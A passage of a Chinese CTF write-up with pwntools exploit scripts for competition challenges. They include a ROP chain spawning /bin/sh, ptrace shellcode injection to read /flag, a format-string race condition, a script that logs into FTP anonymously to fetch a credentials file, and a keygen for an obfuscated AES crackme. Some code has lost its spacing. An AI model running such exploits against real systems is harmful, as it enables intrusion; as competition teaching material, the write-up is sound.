visit\n&#x27;,str(1))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(b&#x27;2: manager visit user to write to user_logs&#x27;,str(1))</span><br><span class="line">#pause()</span><br><span class="line">p.recv(8)</span><br><span class="line">stack_addr=u64(p.recv(8))</span><br><span class="line">print(hex(stack_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;Which permission do you want to log in with?(1:manager 1000:user)\n&quot;,str(1000))</span><br><span class="line">p.sendlineafter(b&quot;user write to logs(USER_write)\n&quot;,b&#x27;USER_write\x00&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;10-19: user can visit\n&#x27;,str(10))</span><br><span class="line">payload=p64(0x3e8)+p64(heap_base+0x2a0+0xa10)+p64(stack_addr-0x150)+p64(0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;Which permission do you want to log in with?(1:manager 1000:user)\n&quot;,str(1))</span><br><span class="line">p.sendlineafter(b&quot;visit user(MANAGER_visit)\n&quot;,b&#x27;MANAGER_visit\x00&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;1-19: manager can visit\n&#x27;,str(1))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(b&#x27;2: manager visit user to write to user_logs&#x27;,str(2))</span><br><span class="line">#pause()</span><br><span class="line">payload=p64(rdi_addr)+p64(stack_addr-0x150+0x40)+p64(rsi_addr)+p64(0)+p64(rdx_r12_addr)+p64(0)*2+p64(system_addr)+b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="canutrytry"><a href="#canutrytry" class="headerlink" title="canutrytry"></a><strong>canutrytry</strong></h2><h2 id="HRPOS"><a href="#HRPOS" class="headerlink" title="HRPOS"></a><strong>HRPOS</strong></h2><p>拿到用户名密码去登录web服务 直接BP改包RCE 执行env就行了 签到题</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">from pwn import *</span><br><span class="line">import ssl</span><br><span class="line">import socket</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def send_cmd(p, cmd):</span><br><span class="line">    p.sendline(cmd.encode())</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    response = p.recv(4096).decode(errors=&#x27;ignore&#x27;)</span><br><span class="line">    return response</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 目标HTTPS服务器信息</span><br><span class="line">    host = &quot;nepctf31-3jcd-j3pz-gpn4-agffc695w505.nepctf.com&quot;</span><br><span class="line">    port = 443</span><br><span class="line"></span><br><span class="line">    # 建立HTTPS连接</span><br><span class="line">    sock = socket.create_connection((host, port))</span><br><span class="line">    ssl_context = ssl.create_default_context()</span><br><span class="line">    ssl_context.check_hostname = False</span><br><span class="line">    ssl_context.verify_mode = ssl.CERT_NONE</span><br><span class="line">    ssl_sock = ssl_context.wrap_socket(sock, server_hostname=host)</span><br><span class="line">    p = remote.fromsocket(ssl_sock)</span><br><span class="line"></span><br><span class="line">    # 创建文件和目录结构</span><br><span class="line">    log.info(&quot;=== 创建更多文件和目录 ===&quot;)</span><br><span class="line">    commands = [</span><br><span class="line">        &quot;mkdir test1&quot;, &quot;mkdir test2&quot;, &quot;mkdir test3&quot;,</span><br><span class="line">        &quot;touch file1&quot;, &quot;touch file2&quot;, &quot;touch file3&quot;, &quot;touch file4&quot;,</span><br><span class="line">        &quot;ln -s file1 link1&quot;,</span><br><span class="line">        &quot;ln -s test1 link2&quot;,</span><br><span class="line">        &quot;ln -s deep1 link3&quot;,</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    for cmd in commands:</span><br><span class="line">        p.sendline(cmd)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        try:</span><br><span class="line">            response = p.recvline().decode().strip()</span><br><span class="line">        except:</span><br><span class="line">            response = &quot;&quot;</span><br><span class="line">        log.info(f&quot;&#123;cmd&#125;: &#123;response&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 创建长符号链接</span><br><span class="line">    log.info(&quot;\n=== 创建长符号链接 ===&quot;)</span><br><span class="line">    long_path = &quot;../&quot; * 8 + &quot;very_long_target_path_to_trigger_filesystem_optimization_logic_with_sufficient_length_for_demonstration_purposes_123456789&quot;</span><br><span class="line">    log.info(f&quot;路径长度: &#123;len(long_path)&#125;&quot;)</span><br><span class="line">    log.info(f&quot;相对引用数: &#123;long_path.count(&#x27;../&#x27;)&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    cmd = f&#x27;ln -s &quot;&#123;long_path&#125;&quot; trigger_link&#x27;</span><br><span class="line">    p.sendline(cmd)</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    response = p.recv(4096).decode().strip()</span><br><span class="line">    log.info(f&quot;创建长符号链接: &#123;response&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 触发漏洞</span><br><span class="line">    log.info(&quot;\n=== 触发漏洞 ===&quot;)</span><br><span class="line">    p.sendline(&quot;ls trigger_link&quot;)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    try:</span><br><span class="line">        response = p.recv(4096).decode().strip()</span><br><span class="line">    except:</span><br><span class="line">        response = &quot;&lt;无响应或连接断开&gt;&quot;</span><br><span class="line">    log.info(f&quot;访问符号链接: &#123;response&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 检查权限</span><br><span class="line">    log.info(&quot;\n=== 检查权限 ===&quot;)</span><br><span class="line">    p.sendline(&quot;whoami&quot;)</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    whoami = p.recv(4096).decode().strip()</span><br><span class="line">    log.info(f&quot;用户信息: &#123;whoami&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # FTP匿名登录测试</span><br><span class="line">    log.info(&quot;\n=== 测试FTP匿名登录 ===&quot;)</span><br><span class="line">    p.sendline(b&#x27;ftp 192.168.1.20&#x27;)  # 发送FTP连接命令</span><br><span class="line">    p.recvuntil(b&#x27;ftp&gt; &#x27;)  # 等待FTP交互提示符</span><br><span class="line">    </span><br><span class="line">    p.sendline(b&#x27;USER anonymous&#x27;)  # 发送匿名用户名</span><br><span class="line">    p.recvuntil(b&#x27;ftp&gt; &#x27;)  # 等待提示符</span><br><span class="line">    </span><br><span class="line">    p.sendline(b&#x27;PASS anonymous&#x27;)  # 发送空密码</span><br><span class="line">    response = p.recvuntil(b&#x27;ftp&gt; &#x27;)  # 获取登录响应</span><br><span class="line">    </span><br><span class="line">    ifb&#x27;230 User logged in&#x27;in response:</span><br><span class="line">        log.success(&quot;✅ FTP匿名登录成功&quot;)</span><br><span class="line">        </span><br><span class="line">        #文件列表获取</span><br><span class="line">        p.sendline(b&#x27;LIST&#x27;)</span><br><span class="line">        response = p.recvuntil(b&#x27;ftp&gt; &#x27;)</span><br><span class="line">        log.success(response.decode().strip())</span><br><span class="line"></span><br><span class="line">        # 测试文件下载</span><br><span class="line">        p.sendline(b&#x27;RETR web_credentials.txt&#x27;)</span><br><span class="line">        response = p.recvuntil(b&#x27;ftp&gt; &#x27;)</span><br><span class="line">        log.success(response.decode().strip())</span><br><span class="line">        </span><br><span class="line">        p.sendline(b&#x27;exit&#x27;)  # 退出FTP</span><br><span class="line">        p.recvuntil(b&#x27;$ &#x27;)  # 等待系统命令提示符</span><br><span class="line">    else:</span><br><span class="line">        log.error(&quot;❌ FTP匿名登录失败&quot;)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    import time</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<h2 id="smallbox"><a href="#smallbox" class="headerlink" title="smallbox"></a><strong>smallbox</strong></h2><p>IDA 打开，是标准 shellcode 题目</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgWUxm9wD1LuF0ibxrIsJ8LwujDSPvCUcM5vWz65LV4ODbkYFpLMMRj1g/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>沙箱只允许调用 ptrace</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg2iaiaM6GOYqcyE4ZTpdjFyxlADvM5Ybe7fzCWOePickM06qHGFI6ndjHA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>题目同时调用了 fork，子进程没有安装沙箱，可以随意调用，于是可以使用 ptrace 注入 shellcode 进子进程。</p>
<p>子进程 pid 可以在栈中找到，结合ptrace 的用法可以写出以下shellcode。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">shellcode=f&#x27;&#x27;&#x27;</span><br><span class="line">    push rdx</span><br><span class="line">    /* ptrace(request=0x10, vararg_0=pid, vararg_1=0, vararg_2=0) */</span><br><span class="line">    xor r10d, r10d /* 0 */</span><br><span class="line">    push &#123;PTRACE_ATTACH&#125;</span><br><span class="line">    pop rdi</span><br><span class="line">    xor edx, edx /* 0 */</span><br><span class="line">    mov esi, [rsp+0x14]</span><br><span class="line">    /* call ptrace() */</span><br><span class="line">    push SYS_ptrace /* 0x65 */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    /* ptrace(request=0xc, vararg_0=pid vararg_1=0x0, vararg_2=shellcode+0x800) */</span><br><span class="line">    pop r10</span><br><span class="line">    push r10</span><br><span class="line">    add r10,0x800</span><br><span class="line">    push &#123;PTRACE_GETREGS&#125;</span><br><span class="line">    pop rdi</span><br><span class="line">    xor edx,edx</span><br><span class="line">    mov esi, [rsp+0x14]</span><br><span class="line">    /* call ptrace() */</span><br><span class="line">    push SYS_ptrace /* 0x65 */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    pop rdx</span><br><span class="line">    push rdx</span><br><span class="line">    add rdx,0x880</span><br><span class="line">    mov rdx,[rdx]</span><br><span class="line">    push rdx</span><br><span class="line">    </span><br><span class="line">    mov rbx,0</span><br><span class="line">loop:</span><br><span class="line">    /* ptrace(request=0xc, vararg_0=pid vararg_1=rip+i, vararg_2=[shellcode+i+0x200]) */</span><br><span class="line">    push &#123;PTRACE_POKETEXT&#125;</span><br><span class="line">    pop rdi</span><br><span class="line">    pop rdx</span><br><span class="line">    pop r10</span><br><span class="line">    push r10</span><br><span class="line">    push rdx</span><br><span class="line">    add rdx,rbx</span><br><span class="line">    mov r10,[r10+rbx+0x200]</span><br><span class="line">    mov esi, [rsp+0x1C]</span><br><span class="line">    /* call ptrace() */</span><br><span class="line">    push SYS_ptrace /* 0x65 */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    add rbx,8</span><br><span class="line">    cmp rbx,0x100</span><br><span class="line">    jle loop</span><br><span class="line"></span><br><span class="line">    /* ptrace(request=0x10, vararg_0=pid, vararg_1=0, vararg_2=0) */</span><br><span class="line">    xor r10d, r10d /* 0 */</span><br><span class="line">    push &#123;PTRACE_DETACH&#125;</span><br><span class="line">    pop rdi</span><br><span class="line">    xor edx, edx /* 0 */</span><br><span class="line">    mov esi, [rsp+0x1C]</span><br><span class="line">    /* call ptrace() */</span><br><span class="line">    push SYS_ptrace /* 0x65 */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></div>

<p>这里将要注入的 shellcode 放在 0xdeadc0de000+0x200 的位置处即可。因为 pid 不是固定的编码，因此shellcraft生成的时候需要进行替换。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">p=process(&#x27;./smallbox&#x27;)</span><br><span class="line"># p=remote(&#x27;127.0.0.1&#x27;,9999)</span><br><span class="line">PTRACE_GETREGS = 12</span><br><span class="line">PTRACE_SETREGS = 13</span><br><span class="line">PTRACE_ATTACH = 16</span><br><span class="line">PTRACE_DETACH = 17</span><br><span class="line">PTRACE_POKETEXT = 4</span><br><span class="line">PTRACE_POKEDATA = 4</span><br><span class="line"></span><br><span class="line">injected_shellcode=shellcraft.open(&quot;/flag&quot;,0)+&#x27;&#x27;&#x27;</span><br><span class="line">mov rax,0</span><br><span class="line">mov rdi,3</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,0x30</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rax,1</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,0x30</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">injected_shellcode=asm(injected_shellcode)</span><br><span class="line"></span><br><span class="line">shellcode=&#x27;&#x27;#在上面展示了</span><br><span class="line">shellcode=asm(shellcode).ljust(0x200,b&#x27;\x00&#x27;)+injected_shellcode</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(&#x27;shellcode:&#x27;,shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a><strong>Time</strong></h2><p>条件竞争题，很容易注意到输入名字这里存在格式化字符串漏洞，可以任意泄露栈上的数据。题目读取文件之后会保存在栈上完成泄露，但是不允许打开flag。</p>
<p>为了防止有些新童鞋想不到条件竞争，因此特意给了一个 hint.txt。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">p = process(&quot;./time&quot;)</span><br><span class="line">p.sendlineafter(b&#x27;name:\n&#x27;, b&#x27;%28$p.%27$p.%26$p.%25$p.%24$p.%23$p.%22$p.%21$p.%20$p&#x27;)</span><br><span class="line">p.sendline(b&#x27;a&#x27;*1000000)</span><br><span class="line">p.sendline(b&#x27;./flag&#x27;)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure></div>

<p>只需要定位之后输入一个很长的文件即可，因为会对输入的文件名进行md5计算，这一步是延时使用的。输出之后按小端序转字符串即可。</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><strong>Reverse</strong></h1><h2 id="Crackme"><a href="#Crackme" class="headerlink" title="Crackme"></a><strong>Crackme</strong></h2><p>这里只说逆向做法的预期解</p>
<p>QT写的一个keygen，通过用户输入username和password</p>
<p>若aesEncrypt_cbc_1(key &#x3D; sign(username), plaintext &#x3D; fromhex(password)) &#x3D; sign(username + “Showmaker11”)，则通过验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgYJk2a2ibibF10Pj8GNnXVPB90Ggiccb7IIgdekDPUS6rS4oAZNDmibZicyg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>aesEncrypt和sign函数在libcrypto.dll中</p>
<p>aesEncrypt的部分经过自实现魔改ollvm的混淆，常规的去混淆脚本是没办法去除的，具体实现感兴趣的可以看看<a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-287052.htm" >https://bbs.kanxue.com/thread-287052.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgel1PGApo7TRzafcdNZWphdah5chZyTsoR8L8cicAZv8P36efWCcc88w/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>这里单纯考验一波分析能力，最终发现是在列混淆的部分多异或了0x55</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgFA17yKnuE2FMgfCfyD1OPXOkjkRR4KxQfF5XfufGJkvZ2npj1rRVicA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>aesDecrypt需要修改的部分</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int invMixColumns(uint8_t(*state)[4]) &#123;</span><br><span class="line">    uint8_t tmp[4][4];</span><br><span class="line">    uint8_t M[4][4] = &#123; &#123;0x0E, 0x0B, 0x0D, 0x09&#125;,</span><br><span class="line">                       &#123;0x09, 0x0E, 0x0B, 0x0D&#125;,</span><br><span class="line">                       &#123;0x0D, 0x09, 0x0E, 0x0B&#125;,</span><br><span class="line">                       &#123;0x0B, 0x0D, 0x09, 0x0E&#125; &#125;;</span><br><span class="line"></span><br><span class="line">    /* copy state[4][4] to tmp[4][4] */</span><br><span class="line">    for (int i = 0; i &lt; 4; ++i) &#123;</span><br><span class="line">        for (int j = 0; j &lt; 4; ++j) &#123;</span><br><span class="line">            tmp[i][j] = state[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; 4; ++i) &#123;</span><br><span class="line">        for (int j = 0; j &lt; 4; ++j) &#123;</span><br><span class="line">            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])</span><br><span class="line">                ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]) ^ 0x55;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>sign函数是魔改的md5算法，然鹅我根本不用关心其具体的魔改点，对于哈希函数我们只需要对其主动调用就好了，最终的注册机代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&quot;aes.h&quot;</span><br><span class="line">usingnamespacestd;</span><br><span class="line"></span><br><span class="line">typedef int (*SignFunc)(uint8_t* input, uint32_t len, uint8_t* output);</span><br><span class="line">SignFunc sign = NULL;</span><br><span class="line"></span><br><span class="line">string getPassword(string username)</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t* usernameBytes = (uint8_t*)username.c_str();</span><br><span class="line">    uint8_t signBytes[16] = &#123; 0 &#125;;</span><br><span class="line">    sign(usernameBytes, username.size(), signBytes);</span><br><span class="line"></span><br><span class="line">    string cipherText = username + &quot;Showmaker11&quot;;</span><br><span class="line">    uint8_t* cipherTextBytes = (uint8_t*)cipherText.c_str();</span><br><span class="line">    uint8_t cipherBytes[16] = &#123; 0 &#125;;</span><br><span class="line">    sign(cipherTextBytes, cipherText.size(), cipherBytes);</span><br><span class="line"></span><br><span class="line">    uint8_t pt[16] = &#123; 0 &#125;;</span><br><span class="line">    aesDecrypt(signBytes, 16, cipherBytes, pt, 16);</span><br><span class="line"></span><br><span class="line">    string password = &quot;&quot;;</span><br><span class="line">    for (int i = 0; i &lt; 16; i++) &#123;</span><br><span class="line">        password += format(&quot;&#123;:02x&#125;&quot;, pt[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">    if (argc != 2) &#123;</span><br><span class="line">        cout &lt;&lt; &quot;Usage: crack.exe &lt;username&gt;&quot; &lt;&lt; endl;</span><br><span class="line">        return1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取命令行输入的用户名</span><br><span class="line">    string username = argv[1];</span><br><span class="line"></span><br><span class="line">    // 加载动态链接库</span><br><span class="line">    HMODULE hDll = LoadLibraryA(&quot;D:\\CTF\\NepCTF_2025\\o11vm\\aes\\libcrypto.dll&quot;);</span><br><span class="line">    if (!hDll) &#123;</span><br><span class="line">        std::cerr &lt;&lt; &quot;无法加载 DLL&quot; &lt;&lt; std::endl;</span><br><span class="line">        return1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取 &quot;sign&quot; 函数的地址</span><br><span class="line">    sign = (SignFunc)GetProcAddress(hDll, &quot;sign&quot;);</span><br><span class="line">    if (!sign) &#123;</span><br><span class="line">        cerr &lt;&lt; &quot;无法获取 sign 函数&quot; &lt;&lt; endl;</span><br><span class="line">        FreeLibrary(hDll);</span><br><span class="line">        return1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取对应用户名的密码</span><br><span class="line">    string password = getPassword(username);</span><br><span class="line">    cout &lt;&lt; password &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    // 卸载 DLL</span><br><span class="line">    FreeLibrary(hDll);</span><br><span class="line">    return0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>验证通过</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgARJibezwpicCgo2jb9VPCUEImibHC9DXI3AAxicd6ialbNC9libLbbuf5C3A/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>绝大部分师傅都是能直接写出注册机的，还有些师傅是动调手动获取了每个用户名对应的密钥和密文，惊呆了</p>
<p>然后是靶机中的100个用户名，我的预期解是将前端获取用户名和提交flag的接口逆向，自己去发包</p>
<p>然鹅发现100个对于大家来说似乎都不算多（），基本上都是手交的。不过问题不大，下次一定会加数量的（）</p>
<p>最终的exp</p>
